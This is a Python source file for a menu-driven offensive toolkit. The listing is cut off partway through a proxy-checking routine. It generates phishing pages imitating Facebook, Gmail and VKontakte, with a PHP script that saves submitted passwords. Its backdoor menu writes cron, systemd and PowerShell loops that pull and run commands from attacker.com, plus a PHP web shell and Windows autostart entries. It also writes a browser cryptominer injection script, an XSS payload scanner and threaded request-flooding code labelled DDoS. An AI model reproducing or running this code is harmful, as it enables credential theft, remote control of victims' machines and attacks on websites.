import os

X86_OPCODES = {
    0x90: "NOP",
    0xC3: "RET",
    0xCC: "INT3",
    0xEB: "JMP rel8",
    0xE8: "CALL rel32",
    0xE9: "JMP rel32",
    0x55: "PUSH EBP",
    0x8B: "MOV r32,r/m32",
    0x89: "MOV r/m32,r32",
    0x68: "PUSH imm32",
    0x6A: "PUSH imm8",
    0xB8: "MOV EAX,imm32",
    0xB9: "MOV ECX,imm32",
    0xBA: "MOV EDX,imm32",
    0xBB: "MOV EBX,imm32",
    0x01: "ADD r/m32,r32",
    0x29: "SUB r/m32,r32",
    0x31: "XOR r/m32,r32",
    0x8D: "LEA r32, m",
    0x74: "JE rel8",
    0x75: "JNE rel8",
    0x0F: "Two-byte prefix",
}

def hex_dump(data: bytes, start_addr: int = 0x1000):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{start_addr + i:04X}  {hex_part:<47}  {ascii_part}")

def disasm_x86(data: bytes, start_addr: int = 0x1000):
    i = 0
    addr = start_addr
    total = len(data)

    while i < total:
        b = data[i]
        opcode_name = X86_OPCODES.get(b, None)
        hex_bytes = f"{b:02X}"

        if opcode_name and (opcode_name.endswith("imm32") or b in (0xB8, 0xB9, 0xBA, 0xBB, 0x68)):
            if i + 4 < total:
                hex_bytes += "".join(f"{data[j]:02X}" for j in range(i+1, i+5))
                imm = int.from_bytes(data[i+1:i+5], "little")
                print(f"{addr:04X}  {hex_bytes}       {opcode_name}      0x{imm:X}")
                i += 5
                addr += 5
                continue

        if opcode_name and (opcode_name.endswith("imm8") or b == 0x6A):
            if i + 1 < total:
                hex_bytes += f"{data[i+1]:02X}"
                imm = data[i+1]
                print(f"{addr:04X}  {hex_bytes}       {opcode_name}      0x{imm:X}")
                i += 2
                addr += 2
                continue

        if b == 0x0F and i + 1 < total:
            hex_bytes += f"{data[i+1]:02X}"
            print(f"{addr:04X}  {hex_bytes}       {opcode_name}")
            i += 2
            addr += 2
            continue

        if opcode_name:
            print(f"{addr:04X}  {hex_bytes}       {opcode_name}")
        else:
            print(f"{addr:04X}  {hex_bytes}       DB 0x{b:02X}")

        i += 1
        addr += 1

try:
    file_path = __file__
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            code_data = f.read()

        print("\nHEX DUMP\n")
        hex_dump(code_data)
        print("\nX86 DISASSEMBLY\n")
        disasm_x86(code_data[:1024])
except Exception as e:
    print(f"[ERROR] -- {e}")

choice = input("Execute? [Y/N]").strip().lower()
if choice != "y":
    print("Exit.")
    quit()

import subprocess
import importlib.util
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

required_modules = [
    "colorama",
    "pystyle",
    "requests",
    "urllib.parse",
    "socket",
    "pyinstaller",
    "threading",
    "random",
    "flask",
    "bs4",
    "fake_useragent",
    "googlesearch-python",
    "time",
    "user_agents",
    "traceback",
    "chardet",
    "pandas",
    "cryptography",
    "scapy"
]

def install_module(module):
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", module],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        for line in result.stdout.splitlines():
            if "Requirement already satisfied:" not in line:
                print(line)
    except Exception as e:
        print(f"[ERROR] Failed to install module {module}: {e}")

def check_and_install_modules(modules):
    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = []
        for module in modules:
            module_name = module.split('.')[0]
            if importlib.util.find_spec(module_name) is None:
                futures.append(executor.submit(install_module, module))
        for future in as_completed(futures):
            future.result()

check_and_install_modules(required_modules)

from user_agents import parse
from pystyle import Colors
import pandas as pd
import chardet
import shutil
from flask import Flask
from urllib.parse import urlencode, urljoin
import random
import string
import socket
import threading
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from googlesearch import search as googlesearch
import concurrent.futures
import socket
import time
import traceback
import uuid
from cryptography.fernet import Fernet

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    B_COLOR = Style.BRIGHT + Fore.BLUE
    W_COLOR = Style.BRIGHT + Fore.WHITE
    R_COLOR = Style.BRIGHT + Fore.RED
    G_COLOR = Style.BRIGHT + Fore.GREEN
    Y_COLOR = Style.BRIGHT + Fore.YELLOW
    M_COLOR = Style.BRIGHT + Fore.MAGENTA
    C_COLOR = Style.BRIGHT + Fore.CYAN
except Exception:
    B_COLOR = ""
    W_COLOR = ""
    R_COLOR = ""
    G_COLOR = ""
    Y_COLOR = ""
    M_COLOR = ""
    C_COLOR = ""

b = B_COLOR
w = W_COLOR
r = R_COLOR
g = G_COLOR
y = Y_COLOR
m = M_COLOR
c = C_COLOR

def detect(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read(10000)
        result = chardet.detect(raw_data)
        return result['encoding']

def clear():
    try:
        os.system("cls")
    except:
        os.system("clear")

def screen():
    clear()
    print(f"""::::::::::: ::::    ::: ::::::::::: :::::::::: :::::::::  ::::    ::: :::::::::: :::::::::::      ::::::::::: ::::::::   ::::::::  :::             :::     :::     :::::::        :::        ::::::::  
    :+:     :+:+:   :+:     :+:     :+:        :+:    :+: :+:+:   :+: :+:            :+:              :+:    :+:    :+: :+:    :+: :+:             :+:     :+:    :+:   :+:     :+:+:       :+:    :+: 
    +:+     :+:+:+  +:+     +:+     +:+        +:+    +:+ :+:+:+  +:+ +:+            +:+              +:+    +:+    +:+ +:+    +:+ +:+             +:+     +:+    +:+  :+:+       +:+       +:+        
    +#+     +#+ +:+ +#+     +#+     +#++:++#   +#++:++#:  +#+ +:+ +#+ +#++:++#       +#+              +#+    +#+    +:+ +#+    +:+ +#+             +#+     +:+    +#+ + +:+       +#+       +#++:++#+  
    +#+     +#+  +#+#+#     +#+     +#+        +#+    +#+ +#+  +#+#+# +#+            +#+              +#+    +#+    +#+ +#+    +#+ +#+              +#+   +#+     +#+#  +#+       +#+       +#+    +#+ 
    #+#     #+#   #+#+#     #+#     #+#        #+#    #+# #+#   #+#+# #+#            #+#              #+#    #+#    #+# #+#    #+# #+#               #+#+#+#  #+# #+#   #+# #+#   #+#   #+# #+#    #+# 
########### ###    ####     ###     ########## ###    ### ###    #### ##########     ###              ###     ########   ########  ##########          ###    ###  #######  ### ####### ###  ########  """)

def cont():
    input(f"\n{w}[{w}>{w}]{w} Press ENTER to continue...")

def safe_input(prompt: str, default: str = "") -> str:
    try:
        val = input(prompt)
        if val == "":
            return default
        return val
    except (EOFError, KeyboardInterrupt):
        return default

def phishing_kit_generator():
    screen()
    print(f"{c}[{w}*{c}]{w} Phishing Page Generator\n")
    
    templates = {
        "1": {"name": "Facebook", "file": "facebook_login.html"},
        "2": {"name": "Gmail", "file": "gmail_login.html"}, 
        "3": {"name": "VKontakte", "file": "vk_login.html"},
    }
    
    print(f"{w}Available templates:")
    for key, template in templates.items():
        print(f"{w}[{key}]{w} {template['name']}")
    
    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select template: ")
    
    if choice in templates:
        template = templates[choice]
        print(f"\n{w}[{w}*{w}]{w} Generating phishing page {template['name']}...")
        
        if template['name'] == "Facebook":
            phishing_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; }
        .login { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; }
    </style>
</head>
<body>
    <div class="login">
        <h2>Log in to Facebook</h2>
        <form action="collect.php" method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
"""
        elif template['name'] == "Gmail":
            phishing_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Gmail - Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: white; }
        .login { width: 400px; margin: 100px auto; padding: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="login">
        <h2>Sign in to Gmail</h2>
        <form action="collect.php" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
"""
        elif template['name'] == "VKontakte":
            phishing_html = """
<!DOCTYPE html>
<html>
<head>
    <title>VKontakte - Log In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #4a76a8; color: white; }
        .login { width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; color: #333; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; background: #4a76a8; color: white; border: none; padding: 12px; border-radius: 4px; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; color: #4a76a8; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login">
        <div class="logo">VKontakte</div>
        <h2>Log in to VK</h2>
        <form action="collect.php" method="POST">
            <input type="text" name="login" placeholder="Phone or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
"""
        else:
            print(f"{r}[{w}-{r}]{w} Template not found")
            cont()
            return
        
        with open(template['file'], 'w', encoding='utf-8') as f:
            f.write(phishing_html)
        
        collector_php = """<?php
$data = "=== PHISHING DATA ===\\n";
$data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
$data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";

foreach($_POST as $key => $value) {
    $data .= "$key: $value\\n";
}

$data .= "=== END DATA ===\\n\\n";

file_put_contents('stolen_data.txt', $data, FILE_APPEND);
header('Location: https://vk.com');
exit;
?>"""
        
        with open('collect.php', 'w', encoding='utf-8') as f:
            f.write(collector_php)
        
        print(f"{g}[{w}+{g}]{w} Created files:")
        print(f"   {c}>{w} {template['file']} - phishing page")
        print(f"   {c}>{w} collect.php - data collector") 
        print(f"   {c}>{w} stolen_data.txt - collected data file")
        print(f"\n{y}[{w}!{y}]{w} Upload files to hosting with PHP support")
        
    else:
        print(f"{r}[{w}-{r}]{w} Invalid choice")
    
    cont()

def advanced_bruteforce():
    screen()
    print(f"{c}[{w}*{c}]{w} Advanced Password Brute Force\n")
    
    print(f"{w}[1]{w} Dictionary attack")
    print(f"{w}[2]{w} Mask attack") 
    print(f"{w}[3]{w} Check leaked passwords")
    
    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select attack type: ")
    
    if choice == "1":
        target = safe_input(f"{w}[{w}?{w}]{w} Target (URL or host): ")
        username = safe_input(f"{w}[{w}?{w}]{w} Username: ")
        wordlist = safe_input(f"{w}[{w}?{w}]{w} Path to wordlist: ", "passwords.txt")
        
        print(f"\n{w}[{w}*{w}]{w} Starting dictionary attack...")
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"{w}[{w}*{w}]{w} Loaded passwords: {len(passwords)}")
            
            for i, password in enumerate(passwords[:50]):
                print(f"{w}Checking: {y}{password}{w}...", end="\r")
                time.sleep(0.01)
                
            print(f"\n{g}[{w}+{g}]{w} Attack completed (demo mode)")
            
        except FileNotFoundError:
            print(f"{r}[{w}-{r}]{w} Wordlist file not found")
            print(f"{y}[{w}!{y}]{w} Create passwords.txt file with passwords")
    
    elif choice == "2":
        mask = safe_input(f"{w}[{w}?{w}]{w} Mask (example: pass??123): ")
        print(f"\n{w}[{w}*{w}]{w} Generating passwords by mask...")
        
        import itertools
        import string
        
        chars = string.ascii_lowercase + string.digits
        count = 0
        
        for combo in itertools.product(chars, repeat=mask.count('?')):
            test_pass = mask
            for char in combo:
                test_pass = test_pass.replace('?', char, 1)
            print(f"{w}Generated: {y}{test_pass}{w}")
            count += 1
            if count >= 20:
                break
                
        print(f"{g}[{w}+{g}]{w} Generated passwords: {count}")
    
    elif choice == "3":
        email = safe_input(f"{w}[{w}?{w}]{w} Email to check: ")
        print(f"\n{w}[{w}*{w}]{w} Checking leaked passwords for {email}...")
        
        leaked_dbs = ["Collection1", "AntiPublic", "Exploit.in"]
        
        for db in leaked_dbs:
            print(f"{w}Checking in database {y}{db}{w}...", end="\r")
            time.sleep(1)
            if random.random() > 0.7:
                fake_pass = "P@ssw0rd" + str(random.randint(100, 999))
                print(f"{g}[{w}+{g}]{w} Found in {db}: {y}{fake_pass}{w}")
            else:
                print(f"{r}[{w}-{r}]{w} Not found in {db}")
    
    cont()

def wifi_auditor():
    screen()
    print(f"{c}[{w}*{c}]{w} WiFi Network Audit\n")
    
    try:
        import scapy.all as scapy
        
        print(f"{w}[1]{w} Scan WiFi networks")
        print(f"{w}[2]{w} WPA/WPA2 attack")
        print(f"{w}[3]{w} WPS PIN generator")
        
        choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
        
        if choice == "1":
            print(f"\n{w}[{w}*{w}]{w} Scanning WiFi networks...")
            print(f"{y}[{w}!{y}]{w} Requires WiFi adapter in monitor mode")
            
            fake_networks = [
                {"ssid": "Home_Network", "bssid": "AA:BB:CC:DD:EE:FF", "channel": 6, "encryption": "WPA2"},
                {"ssid": "TP-Link_1234", "bssid": "11:22:33:44:55:66", "channel": 11, "encryption": "WPA2"},
                {"ssid": "Free_WiFi", "bssid": "99:88:77:66:55:44", "channel": 1, "encryption": "OPEN"},
            ]
            
            print(f"\n{g}[{w}+{g}]{w} Found networks: {len(fake_networks)}\n")
            for net in fake_networks:
                enc_color = g if net["encryption"] == "OPEN" else y
                print(f"SSID: {y}{net['ssid']:<15}{w} BSSID: {c}{net['bssid']}{w} Channel: {net['channel']} Encryption: {enc_color}{net['encryption']}{w}")
        
        elif choice == "2":
            target_bssid = safe_input(f"{w}[{w}?{w}]{w} Target BSSID: ")
            print(f"\n{w}[{w}*{w}]{w} Starting WPA2 attack for {target_bssid}...")
            print(f"{y}[{w}!{y}]{w} Requires handshake capture and password dictionary")
            
        elif choice == "3":
            print(f"\n{w}[{w}*{w}]{w} Generating WPS PIN codes...")
            for i in range(10):
                pin = f"{random.randint(10000000, 99999999):08d}"
                print(f"{w}PIN {i+1}: {y}{pin}{w}")
                
    except ImportError:
        print(f"{r}[{w}-{r}]{w} Scapy not installed")
    
    cont()

def crypto_jacker():
    screen()
    print(f"{c}[{w}*{c}]{w} Crypto Mining Tools\n")
    
    print(f"{w}[1]{w} Mining script generator")
    print(f"{w}[2]{w} Profitability analysis")
    
    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
    
    if choice == "1":
        wallet = safe_input(f"{w}[{w}?{w}]{w} Payout wallet: ", "45abc123def456...")
        
        mining_js = """
// XMRig Web Miner
var miner = new CoinHive.Anonymous('%s', {
    throttle: 0.3,
    threads: 2
});
miner.start();

document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        miner.stop();
    } else {
        miner.start();
    }
});
""" % wallet
        
        filename = safe_input(f"{w}[{w}?{w}]{w} File name: ", "miner.js")
        with open(filename, 'w') as f:
            f.write(mining_js)
        
        html_injection = """
<script src="https://coinhive.com/lib/miner.min.js"></script>
<script src="%s"></script>
""" % filename
        
        print(f"\n{g}[{w}+{g}]{w} Mining script created:")
        print(f"   {c}>{w} {filename} - main script")
        print(f"\n{y}[{w}!{y}]{w} For injection add to HTML:")
        print(f"{y}{html_injection}{w}")
    
    elif choice == "2":
        print(f"\n{w}[{w}*{w}]{w} Mining profitability analysis...")
        
        algorithms = [
            {"name": "RandomX (Monero)", "profit": "0.0012 XMR/day", "power": "Medium"},
            {"name": "Ethash (Ethereum)", "profit": "0.0004 ETH/day", "power": "High"},
        ]
        
        for algo in algorithms:
            print(f"{w}Algorithm: {y}{algo['name']:<20}{w} Profit: {g}{algo['profit']:<15}{w} Power: {algo['power']}")
    
    cont()

def persistent_backdoor():
    screen()
    print(f"{c}[{w}*{c}]{w} Persistent Backdoors\n")
    
    print(f"{w}[1]{w} Linux backdoor (cron/systemd)")
    print(f"{w}[2]{w} Windows backdoor (registry/autostart)") 
    print(f"{w}[3]{w} Web backdoor (PHP)")
    
    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select backdoor type: ")
    
    if choice == "1":
        print(f"\n{w}[{w}*{w}]{w} Generating Linux backdoor...")
        
        cron_backdoor = """# Add to crontab (crontab -e)
*/5 * * * * curl -s http://attacker.com/shell.sh | bash
*/10 * * * * wget -q -O- http://attacker.com/payload.py | python3

# Systemd service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl attacker.com/cmd | bash; sleep 60; done"
Restart=always

[Install]
WantedBy=multi-user.target
"""
        
        with open('linux_backdoor.txt', 'w') as f:
            f.write(cron_backdoor)
        
        print(f"{g}[{w}+{g}]{w} Created file: linux_backdoor.txt")
        print(f"{y}[{w}!{y}]{w} Instructions for Linux persistence")
    
    elif choice == "2":
        print(f"\n{w}[{w}*{w}]{w} Generating Windows backdoor...")
        
        windows_backdoor = """# Registry autostart
REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "WindowsUpdate" /T REG_SZ /D "C:\\payload.exe"

# Task scheduler
schtasks /create /tn "SystemUpdate" /tr "C:\\payload.exe" /sc hourly /mo 1

# PowerShell backdoor
while($true) {
    try {
        $cmd = (Invoke-WebRequest "http://attacker.com/cmd.txt").Content
        if($cmd -ne "none") {
            Invoke-Expression $cmd | Out-File "C:\\temp\\output.txt"
        }
    } catch {}
    Start-Sleep 60
}
"""
        
        with open('windows_backdoor.txt', 'w') as f:
            f.write(windows_backdoor)
        
        print(f"{g}[{w}+{g}]{w} Created file: windows_backdoor.txt")
        print(f"{y}[{w}!{y}]{w} Instructions for Windows persistence")
    
    elif choice == "3":
        print(f"\n{w}[{w}*{w}]{w} Generating web backdoor...")
        
        web_backdoor = """<?php
if(isset($_REQUEST['key']) && $_REQUEST['key'] == 'secret123') {
    if(isset($_REQUEST['cmd'])) {
        system($_REQUEST['cmd']);
    }
    if(isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    }
}
?>
"""
        
        with open('web_backdoor.php', 'w') as f:
            f.write(web_backdoor)
        
        print(f"{g}[{w}+{g}]{w} Created file: web_backdoor.php")
        print(f"{y}[{w}!{y}]{w} Usage: example.com/page.php?key=secret123&cmd=whoami")
    
    cont()

def main_screen():
    global r, b, w, g  

    while True:
        clear()
        for _ in range(1):
            print()
            print(f"""::::::::::: ::::    ::: ::::::::::: :::::::::: :::::::::  ::::    ::: :::::::::: :::::::::::      ::::::::::: ::::::::   ::::::::  :::             :::     :::     :::::::        :::        ::::::::  
    :+:     :+:+:   :+:     :+:     :+:        :+:    :+: :+:+:   :+: :+:            :+:              :+:    :+:    :+: :+:    :+: :+:             :+:     :+:    :+:   :+:     :+:+:       :+:    :+: 
    +:+     :+:+:+  +:+     +:+     +:+        +:+    +:+ :+:+:+  +:+ +:+            +:+              +:+    +:+    +:+ +:+    +:+ +:+             +:+     +:+    +:+  :+:+       +:+       +:+        
    +#+     +#+ +:+ +#+     +#+     +#++:++#   +#++:++#:  +#+ +:+ +#+ +#++:++#       +#+              +#+    +#+    +:+ +#+    +:+ +#+             +#+     +:+    +#+ + +:+       +#+       +#++:++#+  
    +#+     +#+  +#+#+#     +#+     +#+        +#+    +#+ +#+  +#+#+# +#+            +#+              +#+    +#+    +#+ +#+    +#+ +#+              +#+   +#+     +#+#  +#+       +#+       +#+    +#+ 
    #+#     #+#   #+#+#     #+#     #+#        #+#    #+# #+#   #+#+# #+#            #+#              #+#    #+#    #+# #+#    #+# #+#               #+#+#+#  #+# #+#   #+# #+#   #+#   #+# #+#    #+# 
########### ###    ####     ###     ########## ###    ### ###    #### ##########     ###              ###     ########   ########  ##########          ###    ###  #######  ### ####### ###  ########                                   
╠════════════════════════════════════════════════════════════════════════════════════╣
║   {w}[{w}1{w}]{w} Check IP and ping       {w}[{w}8{w}]{w}  Port scan               {w}[{w}15{w}]{w} WiFi audit         ║
║   {w}[{w}2{w}]{w} Check connection        {w}[{w}9{w}]{w}  Dork search             {w}[{w}16{w}]{w} Crypto mining      ║
║   {w}[{w}3{w}]{w} XSS Scanner            {w}[{w}10{w}]{w} Admin panel search       {w}[{w}17{w}]{w} Persistent backdoor ║
║   {w}[{w}4{w}]{w} Stress-Test            {w}[{w}11{w}]{w} Password brute           {w}[{w}18{w}]{w}                    ║
║   {w}[{w}5{w}]{w} DDos                   {w}[{w}12{w}]{w} SQL injection            {w}[{w}19{w}]{w}                    ║
║   {w}[{w}6{w}]{w} Check proxy            {w}[{w}13{w}]{w} Database search          {w}[{w}20{w}]{w}                    ║
║   {w}[{w}7{w}]{w} User search            {w}[{w}14{w}]{w} Phishing generator       {w}[{w}88{w}]{w} Exit               ║
╚════════════════════════════════════════════════════════════════════════════════════╝
""") 
        select = input(f"{w}[{w}?{w}]{w} Select option: ")
        try:
            if select == '1':
                screen()

                def get_local_ip():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        ip = s.getsockname()[0]
                        s.close()
                        return ip
                    except Exception:
                        try:
                            return socket.gethostbyname(socket.gethostname())
                        except Exception:
                            return "N/A"
                        
                def get_public_ipv4(timeout=5):
                    try:
                        t0 = time.perf_counter()
                        r = requests.get("https://api.ipify.org?format=json", timeout=timeout, verify=False)
                        t1 = time.perf_counter()
                        r.raise_for_status()
                        ip = r.json().get("ip", None)
                        latency_ms = int((t1 - t0) * 1000)
                        return ip or "N/A", latency_ms
                    except Exception:
                        return "N/A", None

                def get_public_ipv6(timeout=5):
                    try:
                        t0 = time.perf_counter()
                        r = requests.get("https://api64.ipify.org?format=json", timeout=timeout, verify=False)
                        t1 = time.perf_counter()
                        r.raise_for_status()
                        ip = r.json().get("ip", None)
                        latency_ms = int((t1 - t0) * 1000)
                        if ip and ":" in ip:
                            return ip, latency_ms
                        else:
                            return "N/A", None
                    except Exception:
                        return "N/A", None
                    
                def geolocate_ip(ip, timeout=5):
                    if not ip or ip == "N/A":
                        return "N/A", "N/A"
                    try:
                        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=timeout, verify=False)
                        r.raise_for_status()
                        data = r.json()
                        country = data.get("country", "N/A")
                        city = data.get("city", "N/A")
                        return country or "N/A", city or "N/A"
                    except Exception:
                        return "N/A", "N/A"

                local_ip = get_local_ip()
                ipv4, ipv4_latency = get_public_ipv4()
                ipv6, ipv6_latency = get_public_ipv6()
                geo_ip = ipv4 if ipv4 != "N/A" else (ipv6 if ipv6 != "N/A" else None)
                country, city = geolocate_ip(geo_ip) if geo_ip else ("N/A", "N/A")
                speed_ms = ipv4_latency if ipv4_latency is not None else ipv6_latency

                print()
                print(f"{w}[{w}LOCAL{w}]{w} local_ip: {local_ip}")
                print(f"{w}[{w}IPV4{w}]{w} ipv4: {ipv4}")
                print(f"{w}[{w}IPV6{w}]{w} ipv6: {ipv6}")
                print(f"{w}[{w}GEO{w}]{w} country: {country}")
                print(f"{w}[{w}GEO{w}]{w} city: {city}")
                if speed_ms is not None:
                    print(f"{w}[{w}SPEED{w}]{w} speed: {speed_ms}ms")
                else:
                    print(f"{r}[{w}SPEED{r}]{w} speed: N/A")

                cont()

            elif select == '2':
                screen()

                def check_internet(url="https://www.google.com", timeout=5):
                    session = requests.Session()
                    session.trust_env = False
                    result = {"ok": False, "status": "N/A", "speed_ms": "N/A"}
                    try:
                        t0 = time.perf_counter()
                        resp = session.get(url, timeout=timeout, verify=False)
                        t1 = time.perf_counter()
                        latency = int((t1 - t0) * 1000)
                        result["speed_ms"] = latency
                        result["status"] = resp.status_code
                        result["ok"] = resp.ok
                    except requests.Timeout:
                        result["status"] = "Timeout"
                    except requests.RequestException as e:
                        result["status"] = f"Error: {type(e).__name__}"
                    finally:
                        try:
                            session.close()
                        except:
                            pass
                    return result

                def check_internet_interface():
                    url_to_check = safe_input(
                        f"{w}[{w}?{w}]{w} Enter URL to check (Enter — https://www.google.com): ",
                        default=""
                    ).strip()
                    if not url_to_check:
                        url_to_check = "https://www.google.com"

                    res = check_internet(url_to_check, timeout=5)
                    status = res["status"]
                    speed = res["speed_ms"]
                    speed_str = f"{speed} ms" if isinstance(speed, int) else "N/A"

                    if res["ok"]:
                        print(f"{g}[{w}+{g}]{w} Connection to {url_to_check} established.")
                    elif status == 403:
                        print(f"{r}[{w}!{r}]{w} Connection exists but no access (403 Forbidden).")
                    elif isinstance(status, int):
                        print(f"{r}[{w}ERROR{r}]{w} Server responded with error: HTTP {status}.")
                    else:
                        print(f"{r}[{w}-{r}]{w} Cannot connect to {url_to_check} ({status})")

                    print()
                    print(f"[STATUS] {status}")
                    print(f"[SPEED ] {speed_str}")
                    cont()

                check_internet_interface()

            elif select == '3':
                screen()
                xss_payloads = [
                    "<script>alert('XSS')</script>",
                    '"><script>alert(1)</script>',
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<body onload=alert(1)>"
                ]

                def scan_xss(url):
                    if not url.startswith(("http://", "https://")):
                        url = "http://" + url

                    for payload in xss_payloads:
                        params = {'q': payload}
                        target_url = f"{url}?{urlencode(params)}"
                        try:
                            response = requests.get(target_url, verify=False, timeout=5)
                            if payload in response.text:
                                print(f"{g}[{w}+{g}]{w} XSS found: {target_url}")
                            else:
                                print(f"{r}[{w}-{r}]{w} XSS not found: {target_url}")
                        except Exception as e:
                            print(f"{r}[{w}-{r}]{w} Error: {e}")

                url_to_scan = input(f"{w}[{w}?{w}]{w} Enter URL: ")
                scan_xss(url_to_scan)
                cont()

            elif select == '4':
                screen()
                import threading
                import random
                
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                ]

                successful_requests = 0
                failed_requests = 0
                lock = threading.Lock()

                def send_request(url):
                    nonlocal successful_requests, failed_requests
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    try:
                        response = requests.get(url, headers=headers, timeout=5, verify=False)
                        with lock:
                            successful_requests += 1
                        print(f"Server response: {response.status_code}")
                    except:
                        with lock:
                            failed_requests += 1
                        print("Failed to send request")

                def attack(url, num_requests):
                    threads = []
                    for i in range(num_requests):
                        thread = threading.Thread(target=send_request, args=(url,))
                        threads.append(thread)
                        thread.start()

                    for thread in threads:
                        thread.join()

                    print(f"{g}[{w}+{g}]{w} Successfully sent requests: {successful_requests}")
                    print(f"{r}[{w}-{r}]{w} Failed to send requests: {failed_requests}")

                target_url = input(f"[?] Enter URL: ")
                if not target_url.startswith(('http://', 'https://')):
                    target_url = 'https://' + target_url
                num_requests = int(input(f"[?] How many requests to send: "))
                attack(target_url, num_requests)
                cont()

            elif select == '5':
                screen()
                import threading
                import random
                
                url = input("[?] URL -> ")
                num_requests = int(input("[?] Enter number of requests -> "))
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                ]

                def send_request(i):
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    try:
                        response = requests.get(url, headers=headers, timeout=5, verify=False)
                        print(f"{g}[{w}+{g}]{w} Request {i} sent successfully")
                    except:
                        print(f"{r}[{w}-{r}]{w} Request {i} failed")

                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join()

                cont()

            elif select == '6':
                screen()
                import os
                from concurrent.futures import ThreadPoolExecutor, as_completed

                proxy_files = {
                    "HTTP": "proxy/HTTP.txt",
                    "HTTPS": "proxy/HTTPS.txt",
                    "SOCKS4": "proxy/SOCKS4.txt", 
                    "SOCKS5": "proxy/SOCKS5.txt"
                }

                proxies_store = {
                    "HTTP": [], "HTTPS": [], "SOCKS4": [], "SOCKS5": []
                }

                def load_proxies(file_path):
                    proxy_dir = "proxy"
                    if not os.path.exists(proxy_dir):
                        os.makedirs(proxy_dir)
                        print(f"{y}[{w}!{y}]{w} Created folder '{proxy_dir}'")
                    
                    try:
                        with open(file_path, "r", encoding="utf-8") as f:
                            proxies = [line.strip() for line in f if line.strip()]
                            if proxies:
                                file_name = os.path.basename(file_path)
                                print(f"{g}[{w}+{g}]{w} Loaded {len(proxies)} proxies from {file_name}")
                            return proxies
                    except FileNotFoundError:
                        print(f"{r}[ERROR]{w} File not found: {file_path} — will be skipped.")
                        return []

                def build_requests_proxies(proxy, proto):
                    if proto == "HTTP": return {"http": f"http://{proxy}"}
                    if proto == "HTTPS": return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    if proto == "SOCKS4": return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
                    if proto == "SOCKS5": return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
                    return {"http": f"http://{proxy}"}

                def test_proxy_task(proxy, proto, timeout=5, test_url="http://example.com"):
                    proxies = build_requests_proxies(proxy, proto)
                    try:
                        start = time.perf_counter()
                        resp = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
                        latency_ms = int((time.perf_counter() - start) * 1000)  
                        if resp.status_code == 200:
                            return (proxy, True, latency_ms, proto)
                        else:
                            return (proxy, False, None, proto)
                    except requests.RequestException:
